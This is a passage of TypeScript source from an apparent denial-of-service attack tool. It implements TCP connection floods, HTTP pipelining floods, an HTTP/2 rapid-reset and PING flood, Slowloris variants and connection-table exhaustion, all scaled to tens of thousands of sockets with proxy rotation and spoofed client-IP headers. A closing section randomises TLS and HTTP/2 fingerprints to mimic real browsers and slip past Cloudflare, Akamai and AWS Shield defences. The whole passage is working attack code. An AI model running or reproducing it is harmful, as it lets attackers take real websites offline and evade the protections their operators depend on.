          sock.write(hdr, (err) => { if (err) cleanup(); else { localPkts++; localBytes += hdr.length; } });
        }, randInt(12_000, 30_000));
      };
      if (isHttps) (sock as tls.TLSSocket).once("secureConnect", onConn);
      else sock.once("connect", onConn);
      sock.once("error", cleanup); sock.once("timeout", cleanup); sock.once("close", cleanup);
      signal.addEventListener("abort", () => { if (iv) clearInterval(iv); try { sock.destroy(); } catch { /**/ } if (!settled) { settled = true; resolve(); } }, { once: true });
    });
    const runSlot = async () => { while (!signal.aborted) { await oneSlot(); if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 10)); } };
    await Promise.all(Array.from({ length: SLOTS_C }, runSlot));
  };

  await Promise.all([
    ...Array.from({ length: SLOTS_A }, () => runLayerA()),
    runLayerB(),
    runLayerC(),
  ]);
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  TCP FLOOD — exhausts connection state tables
// ─────────────────────────────────────────────────────────────────────────
async function runTCPFlood(
  resolvedHost: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  // Rotate ports to stress multiple listeners simultaneously
  const PORTS = [
    targetPort, targetPort, targetPort, // weight target port
    targetPort === 443 ? 80 : 443,
    8080, 8443, 3000, 5000, 8000, 8888,
  ];
  // Deployed (32GB): threads*25 — 25 connections per thread; 8K→20K ceiling
  const MAX_INFLIGHT = IS_DEPLOYED ? Math.min(threads * 25, 20000) : Math.min(threads * 15, 8000);
  let inflight = 0;
  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const doConnect = () => {
    if (signal.aborted) return;
    inflight++;
    const p    = PORTS[randInt(0, PORTS.length)];
    const sock = net.createConnection({ host: resolvedHost, port: p });
    sock.setNoDelay(true);
    sock.setTimeout(600);

    const kill = setTimeout(() => { sock.destroy(); inflight--; }, 800);

    sock.once("connect", () => {
      localPkts++;
      // Send a partial/malformed HTTP request to keep the server busy
      const req  = `GET ${hotPath()}?_=${randStr(8)}&v=${randInt(1,9999999)} HTTP/1.1\r\nHost: ${resolvedHost}\r\nUser-Agent: ${randUA()}\r\nX-Forwarded-For: ${randIp()}\r\nConnection: keep-alive\r\n`;
      const junk = Buffer.allocUnsafe(randInt(256, 1500));
      // Fill junk with random bytes
      for (let i = 0; i + 4 <= junk.length; i += 4) junk.writeUInt32LE(Math.random() * 0x100000000 >>> 0, i);
      sock.write(Buffer.concat([Buffer.from(req), junk]), () => {
        localBytes += req.length + junk.length + 60;
        clearTimeout(kill);
        inflight--;
        sock.destroy();
      });
    });
    sock.once("error",   () => { localPkts++; localBytes += 20; clearTimeout(kill); inflight--; });
    sock.once("timeout", () => { clearTimeout(kill); inflight--; sock.destroy(); });
  };

  const launcher = async () => {
    while (!signal.aborted) {
      if (inflight < MAX_INFLIGHT) { doConnect(); await Promise.resolve(); }
      else await new Promise(r => setTimeout(r, 1));
    }
  };

  // Deployed: 400 launcher coroutines (was 150) — more parallel SYN bursts
  const MAX_LAUNCHERS = IS_DEPLOYED ? Math.min(threads, 400) : Math.min(threads, 150);
  await Promise.all(Array.from({ length: MAX_LAUNCHERS }, () => launcher()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP PIPELINE — raw TCP keep-alive, NO fetch() overhead
//
//  Each connection stays open and sends requests back-to-back without
//  waiting for responses (HTTP/1.1 pipelining — RFC 7230 §6.3.2).
//  The receive side is drained so flow control never blocks.
//
//  Achieves 50K – 300K req/s per worker depending on target RTT.
// ─────────────────────────────────────────────────────────────────────────
async function runHTTPPipeline(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  proxies: ProxyConfig[],
  signal: AbortSignal,
  onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  let localPkts = 0, localBytes = 0, pIdx = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  // Deployed (8 vCPU/32GB): 1024-slot pool × 512-req batches (was 512/256)
  const POOL_SIZE = IS_DEPLOYED ? 1024 : 512;
  const PIPELINE  = IS_DEPLOYED ? 512 : 256; // requests per write batch

  // Pre-build a pool of raw HTTP request buffers
  const reqPool: Buffer[] = Array.from({ length: POOL_SIZE }, () => buildRawReq(hostname));

  function buildRawReq(host: string): Buffer {
    const path       = hotPath() + `?_=${randStr(10)}&v=${randInt(1, 999999999)}&cb=${Math.random().toString(36).slice(2,8)}`;
    const rng        = Math.random();
    const isPost     = rng < 0.35;   // 35% POST — forces server-side read/parse
    const isChunked  = isPost && Math.random() < 0.25; // 25% of POSTs use chunked TE (forces chunk parser)
    const isUpgrade  = !isPost && Math.random() < 0.12; // 12% GET with Upgrade header (h2c/websocket parsing)
    // Chunked body: sends a single "incomplete" chunk (no terminating 0\r\n\r\n) → server waits for more data
    const jsonBody   = `{"q":"${randStr(12)}","ts":${Date.now()},"id":"${randHex(8)}"}`;
    const chunkBody  = isChunked
      ? `${jsonBody.length.toString(16)}\r\n${jsonBody}\r\n` // valid chunk but missing terminator
      : jsonBody;
    const body       = isPost ? chunkBody : "";
    const lines      = [
      `${isPost ? "POST" : "GET"} ${path} HTTP/1.1`,
      `Host: ${host}`,
      `User-Agent: ${randUA()}`,
      `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,*/*;q=0.8`,
      `Accept-Encoding: gzip, deflate, br, zstd`,
      `Accept-Language: en-US,en;q=0.9`,
      `X-Forwarded-For: ${randIp()}, ${randIp()}, ${randIp()}`,
      `X-Real-IP: ${randIp()}`,
      `CF-Connecting-IP: ${randIp()}`,
      `X-Request-ID: ${randHex(16)}`,
      `Cache-Control: no-cache, no-store, must-revalidate`,
      `Pragma: no-cache`,
      `Priority: u=${randInt(0, 7)}, i`,  // RFC 9218 priority hints — forces server priority queue work
      `Referer: https://google.com/search?q=${randStr(8)}`,
      `Cookie: session=${randHex(24)}; _ga=GA1.${randInt(1,9)}.${randInt(1e8,9e8)}.${Date.now()}`,
      `Sec-CH-UA: "Chromium";v="136", "Google Chrome";v="136", "Not-A.Brand";v="8"`,
      `Sec-CH-UA-Mobile: ?0`,
      `Sec-CH-UA-Platform: "Windows"`,
      `Connection: keep-alive`,
    ];
    if (isUpgrade) {
      // HTTP Upgrade — forces server to parse Connection: Upgrade header block even if ignored
      lines.push(`Upgrade: h2c, websocket`);
      lines.push(`Connection: Upgrade, keep-alive`);
    }
    if (isPost) {
      lines.push(isChunked ? `Transfer-Encoding: chunked` : `Content-Type: application/json`);
      if (!isChunked) lines.push(`Content-Length: ${body.length}`);
    }
    lines.push(``, body); // blank line + optional body
    return Buffer.from(lines.join("\r\n"));
  }

  // Refresh pool continuously — 4 entries per 20ms tick keeps paths/IPs/tokens fresh
  const poolIv = setInterval(() => {
    for (let i = 0; i < 4; i++) reqPool[randInt(0, POOL_SIZE)] = buildRawReq(hostname);
  }, 20);

  const oneConn = async (): Promise<void> => {
    if (signal.aborted) return;
    let sock: tls.TLSSocket | net.Socket;
    try {
      // mkTLSSock routes through SOCKS5/HTTP proxy for IP rotation
      sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["http/1.1"]);
    } catch { return; }
    sock.setNoDelay(true);
    sock.setTimeout(12_000);

    await new Promise<void>((resolve) => {
      const pump = () => {
        if (signal.aborted) { sock.destroy(); resolve(); return; }
        let ok = true;
        for (let i = 0; i < PIPELINE; i++) {
          const buf = reqPool[randInt(0, POOL_SIZE)];
          localPkts++;
          localBytes += buf.length;
          ok = sock.write(buf);
          if (!ok) break; // backpressure — wait for drain
        }
        if (ok) setImmediate(pump); // setImmediate instead of setTimeout for max throughput
        else sock.once("drain", pump);
      };
      // mkTLSSock already connected — start pumping immediately
      setImmediate(pump);
      sock.on("data",    () => {}); // drain responses — keeps TCP window open
      sock.on("timeout", () => { sock.destroy(); resolve(); });
      sock.on("error",   () => { resolve(); });
      sock.on("close",   () => { resolve(); });
      signal.addEventListener("abort", () => { sock.destroy(); resolve(); }, { once: true });
    });
  };

  // ★ Async reconnect loop — exactly one connection per slot, no accumulation
  const runConn = async (): Promise<void> => {
    while (!signal.aborted) {
      await oneConn();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 1));
    }
  };

  // Deployed (32GB): 8K pipeline conns — more TCP keep-alive lanes = higher saturation
  const MAX_PIPE_CONNS = IS_DEPLOYED ? Math.min(threads, 8000) : Math.min(threads, 2000);
  await Promise.all(Array.from({ length: MAX_PIPE_CONNS }, runConn));
  clearInterval(flushIv);
  clearInterval(poolIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP/2 FLOOD — native multiplexed H2 streams (node:http2)
//
//  Each session holds up to STREAMS_PER_SESSION concurrent H2 streams, all
//  over a single TCP+TLS connection. Far more efficient per-socket than HTTP/1.1
//  pipelining since H2 uses binary framing with true stream multiplexing.
//
//  Achieves 20K–120K req/s per worker at close RTTs.
// ─────────────────────────────────────────────────────────────────────────
async function runHTTP2Flood(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const { connect: h2connect, constants: h2constants } = await import("node:http2");

  // Deployed (32GB/8vCPU): 4000 sessions × 150KB = 600MB — comfortable
  // 4000 streams per session → 16M possible concurrent H2 streams
  const STREAMS_PER_SESSION = IS_DEPLOYED ? Math.min(4000, Math.max(256, threads * 8)) : Math.min(2000, Math.max(64, threads * 4));
  const NUM_SESSIONS        = IS_DEPLOYED ? Math.min(threads, 4000) : Math.min(threads, 2000);
  const connectTarget       = `https://${resolvedHost}:${targetPort}`;

  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  // ── Persistent session loop — restarts until signal aborted ────────────
  // Previous bug: recursive runSession().then(finish) caused the Promise.all
  // to resolve when CF rejected new connections, halting H2 pressure at ~18s.
  // Fix: each session slot loops independently in a while(!aborted) loop.
  const runSessionSlot = async (): Promise<void> => {
    while (!signal.aborted) {
      await new Promise<void>(resolve => {
        let c: ReturnType<typeof h2connect> | null = null;
        try {
          c = h2connect(connectTarget, {
            rejectUnauthorized: false,
            ciphers:        randomJA3Ciphers(),   // Chrome JA3 fingerprint
            ALPNProtocols:  ["h2", "http/1.1"],   // Chrome ALPN order
            settings: {
              ...CHROME_H2_SETTINGS,              // Chrome-exact H2 fingerprint (AKAMAI)
              maxConcurrentStreams: STREAMS_PER_SESSION,
            },
          });
        } catch { resolve(); return; }

        const conn = c;
        const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };

        // Pre-built small DATA payload for POST streams (forces handler dispatch before RST)
        const TINY_DATA = Buffer.from([0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE]);
        let pumpCount = 0;
        const pump = () => {
          if (signal.aborted || conn.destroyed) { resolve(); return; }
          // Deployed: 256 streams per burst (was 128) — doubles H2 RST throughput vs before
          for (let burst = 0; burst < (IS_DEPLOYED ? 256 : 32) && !signal.aborted && !conn.destroyed; burst++) {
            const path     = hotPath() + `?_=${randStr(8)}&v=${randInt(1, 9999999)}&t=${Date.now().toString(36)}`;
            // 35% POST with partial body → forces server handler dispatch before RST (5-10× costlier than pure GET RST)
            const usePost  = Math.random() < 0.35;
            try {
              const stream = conn.request({
                ":method":         usePost ? "POST" : (Math.random() < 0.85 ? "GET" : "HEAD"),
                ":path":           path,
                ":scheme":         "https",
                ":authority":      hostname,
                "user-agent":      randUA(),
                "accept":          "*/*,text/html,application/xhtml+xml",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "x-forwarded-for": `${randIp()}, ${randIp()}, ${randIp()}`,
                "x-real-ip":       randIp(),
                "cf-connecting-ip":randIp(),
                "cache-control":   "no-cache, no-store, must-revalidate",
                "pragma":          "no-cache",
                "referer":         `https://www.google.com/search?q=${randStr(6)}`,
                "x-request-id":    `${randHex(8)}-${randHex(4)}-${randHex(12)}`,
                "cookie":          `session=${randHex(32)}; _ga=GA1.${randInt(1,9)}.${randInt(100000000,999999999)}.${Date.now()}`,
                // Priority header (RFC 9218) — forces server-side priority queue allocation
                "priority":        `u=${randInt(0, 7)}, i`,
                // Sec-CH-UA headers — forces Client Hints processing on modern servers
                "sec-ch-ua":         `"Chromium";v="136", "Google Chrome";v="136", "Not-A.Brand";v="8"`,
                "sec-ch-ua-mobile":  "?0",
                "sec-ch-ua-platform": `"Windows"`,
                ...(usePost ? { "content-type": "application/octet-stream", "content-length": "8" } : {}),
              });
              // ★ ENHANCED RAPID RESET:
              // For POST streams: write partial body (forces handler start + partial body read)
              // then RST — server must cancel the handler mid-dispatch (5-10× more expensive than bare HEADERS→RST)
              if (usePost) {
                try { stream.write(TINY_DATA); } catch { /**/ }
              }
              // RST_STREAM immediately after (HEADERS+partial body) — maximum wasted server work
              setImmediate(() => { try { stream.close(h2constants.NGHTTP2_NO_ERROR); } catch { /**/ } });
              localPkts++;
              localBytes += usePost ? (400 + TINY_DATA.length) : 400;
              stream.on("error", () => { /**/ });
            } catch { break; }
          }
          // ★ PING FLOOD: every 4 bursts (≈256 RST streams) inject 12 PING frames.
          // RFC 7540 §6.7: server MUST send PING ACK for every PING received.
          // 12 mandatory ACKs per 256 RST_STREAMs compounds CPU: server is
          // simultaneously processing RST queue + generating ACK responses.
          pumpCount++;
          if (pumpCount % 4 === 0 && !conn.destroyed) {
            // Deployed: 24 PINGs per 4 bursts — forces 24 mandatory PING ACKs from server
            for (let p = 0; p < (IS_DEPLOYED ? 24 : 6); p++) {
              try {
                const pingData = Buffer.allocUnsafe(8);
                pingData.writeUInt32BE(randInt(0, 0x7fffffff), 0);
                pingData.writeUInt32BE(randInt(0, 0x7fffffff), 4);
                conn.ping(pingData, () => { /* ACK received — we don't care, server had to work */ });
              } catch { /**/ }
            }
            localPkts += 12; localBytes += 12 * 17; // 9-byte frame header + 8-byte payload each
          }
          if (!signal.aborted && !conn.destroyed) setImmediate(pump);
        };

        conn.on("connect", () => { pump(); });
        conn.on("error",   () => { resolve(); }); // will restart in next while iteration
        conn.on("close",   () => { resolve(); }); // will restart in next while iteration
        signal.addEventListener("abort", cleanup, { once: true });
      });
      // Minimal pause before reconnect — faster slot reuse = more sustained RST pressure
      if (!signal.aborted) await new Promise(r => setTimeout(r, IS_DEPLOYED ? 2 + randInt(0, 5) : 8 + randInt(0, 12)));
    }
  };

  await Promise.all(Array.from({ length: NUM_SESSIONS }, () => runSessionSlot()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  SLOWLORIS — real TCP connection pool exhaustion
//
//  Opens thousands of half-open HTTP connections. Each sends a partial request
//  (no final \r\n\r\n), then trickles one fake header line every 10-25s to
//  keep the connection alive without triggering timeouts.
//
//  Exhausts the server's connection pool without sending meaningful traffic.
//  Bypasses per-request rate limits — one connection per server thread slot.
//
//  Achieves 2K–8K concurrent half-open connections.
// ─────────────────────────────────────────────────────────────────────────
async function runSlowlorisReal(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  proxies: ProxyConfig[],
  signal: AbortSignal,
  onStats: (p: number, b: number, c?: number) => void,
  useHttps = false,
): Promise<void> {
  // Deployed (32GB): threads*75, max 30K — each TLS socket ~80KB → 30K = ~2.4GB per worker
  // Non-deployed prod: threads*50, max 15K — 1.2GB per worker
  const MAX_CONN = !IS_PROD
    ? Math.min(threads * 8, 800)                                               // dev: max 800
    : IS_DEPLOYED ? Math.min(threads * 75, 30000) : Math.min(threads * 50, 15000);
  let localPkts = 0, localBytes = 0, activeConns = 0, pIdx = 0;
  const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 250);

  const oneSlowConn = (): Promise<void> => new Promise(async (resolve) => {
    if (signal.aborted) { resolve(); return; }
    let sock: net.Socket;

    if (proxies.length > 0) {
      // mkTLSSock resolves only after TLS handshake is done — safe to use immediately
      try {
        sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["http/1.1"]);
      } catch { resolve(); return; }
      sock.setNoDelay(true);
      sock.setTimeout(180_000);
      // mkTLSSock already connected — start the attack directly
      doSlowloris();
    } else {
      // Direct connection — wait for connect event before starting
      sock = useHttps
        ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
        : net.createConnection({ host: resolvedHost, port: targetPort });
      sock.setNoDelay(true);
      sock.setTimeout(180_000);
      const onConnect = () => doSlowloris();
      if (useHttps) (sock as tls.TLSSocket).once("secureConnect", onConnect);
      else          sock.once("connect", onConnect);
    }
    sock.once("error",   done);
    sock.once("close",   done);
    sock.once("timeout", done);
    signal.addEventListener("abort", done, { once: true });

    let keepIv: NodeJS.Timeout | null = null;
    function done() {
      activeConns = Math.max(0, activeConns - 1);
      if (keepIv) { clearInterval(keepIv); keepIv = null; }
      try { sock.destroy(); } catch { /**/ }
      resolve();
    }
    const cleanup = done;

    function doSlowloris() {
      activeConns++;
      localPkts++;

      // ★ TRIPLE-MODE SLOWLORIS (upgraded from dual):
      // 50% classic GET Slowloris (missing final \r\n\r\n)
      // 35% POST Slowloris (1GB Content-Length, trickle body)
      // 15% HEAD Slowloris (partial headers — many servers parse HEAD headers fully before responding)
      const variant = Math.random();
      const usePost = variant < 0.35;
      const useHead = variant >= 0.85;

      if (usePost) {
        const postHeaders = [
          `POST ${hotPath()}?_=${randStr(8)}&v=${randInt(1, 9999999)} HTTP/1.1`,
          `Host: ${hostname}`,
          `User-Agent: ${randUA()}`,
          `Accept: text/html,application/xhtml+xml,*/*;q=0.8`,
          `Accept-Language: en-US,en;q=0.9`,
          `Accept-Encoding: gzip, deflate`,
          `X-Forwarded-For: ${randIp()}`,
          `Connection: keep-alive`,
          `Content-Type: application/x-www-form-urlencoded`,
          `Content-Length: 1073741824`, // 1GB — server waits for body
          `\r\n`,
        ].join("\r\n");
        sock.write(postHeaders);
        localBytes += postHeaders.length;
        keepIv = setInterval(() => {
          if (signal.aborted || sock.destroyed) { cleanup(); return; }
          const chunk = randStr(randInt(1, 4));
          sock.write(chunk, (err) => { if (err) cleanup(); else { localPkts++; localBytes += chunk.length; } });
        }, randInt(8_000, 18_000));

      } else if (useHead) {
        // HEAD variant — partial HEAD request, server waits for final \r\n\r\n
        const partial = [
          `HEAD ${hotPath()}?_=${randStr(8)} HTTP/1.1`,
          `Host: ${hostname}`,
          `User-Agent: ${randUA()}`,
          `Accept: */*`,
          `Connection: keep-alive`,
          ``, // missing final \r\n
        ].join("\r\n");
        sock.write(partial);
        localBytes += partial.length;
        keepIv = setInterval(() => {
          if (signal.aborted || sock.destroyed) { cleanup(); return; }
          const hdr = `X-${randStr(6)}: ${randStr(randInt(6, 18))}\r\n`;
          sock.write(hdr, (err) => { if (err) cleanup(); else { localPkts++; localBytes += hdr.length; } });
        }, randInt(8_000, 20_000));

      } else {
        // Classic GET Slowloris
        const partial = [
          `GET ${hotPath()}?_=${randStr(8)}&v=${randInt(1, 9999999)} HTTP/1.1`,
          `Host: ${hostname}`,
          `User-Agent: ${randUA()}`,
          `Accept: text/html,application/xhtml+xml,*/*;q=0.8`,
          `Accept-Language: en-US,en;q=0.9`,
          `Accept-Encoding: gzip, deflate`,
          `X-Forwarded-For: ${randIp()}`,
          `Connection: keep-alive`,
          `Referer: https://google.com/`,
          ``, // NO final \r\n\r\n
        ].join("\r\n");
        sock.write(partial);
        localBytes += partial.length;
        keepIv = setInterval(() => {
          if (signal.aborted || sock.destroyed) { cleanup(); return; }
          const hdr = `X-${randStr(5)}-${randStr(3)}: ${randStr(randInt(8, 20))}\r\n`;
          sock.write(hdr, (err) => { if (err) cleanup(); else { localPkts++; localBytes += hdr.length; } });
        }, randInt(8_000, 22_000));
      }

    }
  });

  const runSock = async (): Promise<void> => {
    while (!signal.aborted) {
      await oneSlowConn();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 5));
    }
  };

  await Promise.all(Array.from({ length: MAX_CONN }, runSock));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  CONNECTION FLOOD — pure TCP/TLS connection table exhaustion
//  Opens MAX_CONN connections, completes TLS handshake, holds them open
//  Bypasses ALL HTTP-level rate limiting (nginx limit_req, Cloudflare, etc)
//  because rate limiting only applies AFTER connection is accepted and
//  request headers are parsed. We fill connection slots BEFORE any HTTP.
//  Nginx default: worker_connections 1024 × N workers = ~4096 total.
// ─────────────────────────────────────────────────────────────────────────
async function runConnFlood(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number, c?: number) => void,
  useHttps = false,
  proxies: ProxyConfig[] = [],
): Promise<void> {
  // Deployed (32GB): threads*60, max 20K — 20K × 80KB = 1.6GB per worker
  // Non-deployed prod: threads*40, max 12K — 960MB per worker
  const MAX_CONN = !IS_PROD
    ? Math.min(threads * 8, 800)                                               // dev: max 800
    : IS_DEPLOYED ? Math.min(threads * 60, 20000) : Math.min(threads * 40, 12000);
  let localPkts = 0, localBytes = 0, activeConns = 0, pIdx = 0;
  const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 250);

  const oneConnFlood = async (): Promise<void> => {
    if (signal.aborted) return;
    let sock: net.Socket;
    if (useHttps) {
      sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["http/1.1"],
        { ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-RSA-AES128-GCM-SHA256" });
    } else {
      sock = net.createConnection({ host: resolvedHost, port: targetPort });
    }
    sock.setNoDelay(true);
    sock.setTimeout(120_000); // 2-minute hold — maximizes time connection slot is occupied

    return new Promise<void>(resolve => {
    let settled = false;
    const cleanup = () => {
      if (settled) return;
      activeConns = Math.max(0, activeConns - 1);
      try { sock.destroy(); } catch { /**/ }
      settled = true;
      resolve(); // outer async runSock while-loop handles reconnect
    };

    const onConnected = () => {
      activeConns++;
      localPkts++;
      // Incomplete HTTP/1.1 request — server holds thread waiting for rest of headers
      // Varying paths and IPs defeats simple duplicate-detection filters
      const minReq = [
        `GET ${hotPath()}?_=${randStr(8)} HTTP/1.1`,
        `Host: ${hostname}`,
        `User-Agent: ${randUA()}`,
        `Accept: text/html,application/xhtml+xml,*/*;q=0.9`,
        `Accept-Encoding: gzip, deflate, br`,
        `X-Forwarded-For: ${randIp()}`,
        `X-Real-IP: ${randIp()}`,
        `Connection: keep-alive`,
        `Cookie: session=${randHex(32)}; _ga=GA1.${randInt(1,9)}.${randInt(100000000,999999999)}.${Date.now()}`,
        ``, // intentionally NO final \r\n — server waits forever
      ].join("\r\n");
      sock.write(minReq);
      localBytes += minReq.length;
      // Heartbeat: trickle a fake header every 25-40s to reset server's read timeout.
      // Without this, servers with a short read timeout (e.g. nginx default: 60s)
      // close the connection before we can consume their thread budget.
      const heartbeat = setInterval(() => {
        if (settled || signal.aborted) { clearInterval(heartbeat); return; }
        const hdr = `X-Keep-${randStr(5)}: ${randHex(randInt(8,24))}\r\n`;
        sock.write(hdr, err => { if (err) { clearInterval(heartbeat); } else { localBytes += hdr.length; } });
      }, randInt(25_000, 40_000));
      signal.addEventListener("abort", () => clearInterval(heartbeat), { once: true });
    };

    if (useHttps) {
      (sock as tls.TLSSocket).once("secureConnect", onConnected);
    } else {
      sock.once("connect", onConnected);
    }

    sock.once("error",   cleanup);
    sock.once("timeout", cleanup);
    sock.once("close",   cleanup);

    signal.addEventListener("abort", () => {
      try { sock.destroy(); } catch { /**/ }
      if (!settled) { settled = true; resolve(); }
    }, { once: true });
    }); // end inner Promise
  }; // end oneConnFlood

  const runSock = async (): Promise<void> => {
    while (!signal.aborted) {
      await oneConnFlood();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, randInt(5, 20)));
    }
  };

  await Promise.all(Array.from({ length: MAX_CONN }, runSock));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  GEASS WAF BYPASS — Cloudflare / Akamai / AWS Shield evasion
//
//  Four-layer evasion technique:
//  1. JA3 TLS fingerprint randomization (cipher suite order per-session)
//  2. Chrome-exact HTTP/2 AKAMAI fingerprint (SETTINGS frame values)
//  3. Chrome-exact header ordering (Cloudflare checks header order, not just values)
//  4. Realistic Cloudflare cookie simulation (__cf_bm, __cfruid, cf_clearance)
//
//  Combined effect: each connection looks like a distinct Chrome browser
//  from a different user — impossible to distinguish from real traffic.
//  Works best with proxy rotation (residential IPs bypass IP reputation).
// ─────────────────────────────────────────────────────────────────────────

// Chrome TLS cipher suites — TLS1.3 fixed first, TLS1.2 shuffled per-session
const CF_CIPHERS_TLS13 = [
  "TLS_AES_128_GCM_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_CHACHA20_POLY1305_SHA256",
];
const CF_CIPHERS_TLS12 = [
  "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-RSA-AES128-GCM-SHA256",
  "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384",
  "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-CHACHA20-POLY1305",
  "ECDHE-RSA-AES128-SHA",          "ECDHE-RSA-AES256-SHA",
  "AES128-GCM-SHA256",             "AES256-GCM-SHA384",
  "AES128-SHA",                    "AES256-SHA",
];
// Chrome EC curves — X25519 primary, P-256/P-384 secondary (JA4 ecdh_groups field)
// Rotating this changes the JA4 t= and p= fingerprint fields independently of ciphers
const CHROME_ECDH_CURVES = [
  "X25519:P-256:P-384",
  "X25519:P-256:P-384:P-521",
  "X25519:P-384:P-256",
  "P-256:X25519:P-384",
  "X25519:P-256",
];

// JA4 TLS fingerprint profile — ciphers (JA3) + ecdhCurve (JA4 groups) + minVersion (JA4 version field)
// Rotating all three fields simultaneously defeats JA3+JA4 fingerprint-based WAF blocking.
interface TLSProfile { ciphers: string; ecdhCurve: string; minVersion: string; }
function randomTLSProfile(): TLSProfile {
  const shuffled = [...CF_CIPHERS_TLS12].sort(() => Math.random() - 0.5);
  return {
    ciphers:    [...CF_CIPHERS_TLS13, ...shuffled].join(":"),
    ecdhCurve:  CHROME_ECDH_CURVES[randInt(0, CHROME_ECDH_CURVES.length)],
    // Chrome 130+ allows TLS1.2 for legacy compat; 75% chance → different JA4 version digit
    minVersion: Math.random() < 0.75 ? "TLSv1.2" : "TLSv1.3",
  };
}
// Backward-compat alias — callers that only need ciphers keep working
function randomJA3Ciphers(): string { return randomTLSProfile().ciphers; }

// ── Firefox TLS cipher suites (JA3 — different from Chrome) ─────────────
// Firefox 124-126 sends TLS13 ciphers first, then TLS12 in a FIXED order (not shuffled).
// The fixed order is a Firefox fingerprint — Chrome shuffles TLS12, Firefox does NOT.
const FIREFOX_CIPHERS_TLS13 = [
  "TLS_AES_128_GCM_SHA256",
  "TLS_CHACHA20_POLY1305_SHA256",
  "TLS_AES_256_GCM_SHA384",
];
const FIREFOX_CIPHERS_TLS12_ORDERED = [
  "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-RSA-AES128-GCM-SHA256",
  "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-CHACHA20-POLY1305",
  "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384",
  "ECDHE-ECDSA-AES256-SHA", "ECDHE-ECDSA-AES128-SHA",
  "ECDHE-RSA-AES128-SHA", "ECDHE-RSA-AES256-SHA",
  "AES128-GCM-SHA256", "AES256-GCM-SHA384", "AES128-SHA", "AES256-SHA",
];
function firefoxTLSProfile(): TLSProfile {
  // Firefox does NOT shuffle TLS1.2 ciphers — fixed order is part of the JA3 fingerprint
  const variant = Math.random() < 0.5; // slight variation between FF versions
  return {
    ciphers: [...FIREFOX_CIPHERS_TLS13, ...FIREFOX_CIPHERS_TLS12_ORDERED.slice(0, variant ? 14 : 12)].join(":"),
    ecdhCurve: Math.random() < 0.8 ? "X25519:P-256:P-384:P-521" : "X25519:P-256:P-384",
    minVersion: "TLSv1.2",
  };
}

// ── Safari TLS cipher suites (JA3 — unique to Safari/WebKit) ────────────
const SAFARI_CIPHERS = [
  "TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256",
  "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-GCM-SHA256",
  "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-RSA-AES128-GCM-SHA256",
  "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-CHACHA20-POLY1305",
  "ECDHE-ECDSA-AES256-SHA", "ECDHE-RSA-AES256-SHA",
  "AES256-GCM-SHA384", "AES128-GCM-SHA256", "AES256-SHA",
];
function safariTLSProfile(): TLSProfile {
  return {
    ciphers: SAFARI_CIPHERS.join(":"),
    ecdhCurve: "X25519:P-256:P-384",
    minVersion: "TLSv1.2",
  };
}

// Browser type tag for fingerprint-aware code
type BrowserType = "chrome" | "firefox" | "safari";

// ── H2 SETTINGS per browser — AKAMAI second-level fingerprint ───────────
// AKAMAI fingerprint = JA3 (cipher) + H2 SETTINGS values + WINDOW_UPDATE increment
// Chrome, Firefox, Safari each send different SETTINGS and different WU increments.

// Chrome 136: HEADER_TABLE_SIZE=65536, ENABLE_PUSH=0, INITIAL_WINDOW_SIZE=6291456, MAX_HEADER_LIST_SIZE=262144
